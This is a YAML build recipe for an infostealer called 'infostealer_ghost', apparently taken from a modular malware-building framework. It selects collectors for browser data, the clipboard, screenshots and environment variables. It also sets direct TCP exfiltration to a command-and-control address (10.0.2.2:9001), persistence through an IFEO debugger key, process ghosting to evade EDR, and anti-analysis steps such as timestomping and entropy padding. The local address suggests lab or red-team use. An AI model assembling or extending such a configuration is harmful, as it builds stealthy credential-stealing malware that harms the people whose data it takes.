name: infostealer_ghost
description: Infostealer with process ghosting — binary disappears from disk before EDR image-load callback

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/system_info
  - collectors/processes
  - collectors/installed_software
  - collectors/env_vars
  - collectors/clipboard
  - collectors/browser_chromium
  - collectors/screenshot

exfil: exfil/tcp_direct
arch: arch/sequential

api_resolve: api_resolve/api_hash_fnv1a
process: process/process_ghost

persist: persist/ifeo_debugger

resources: true

evasion:
  - evasion/entropy_pad
  - evasion/rich_header
  - evasion/timestomp
  - evasion/behavioral_pacing

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
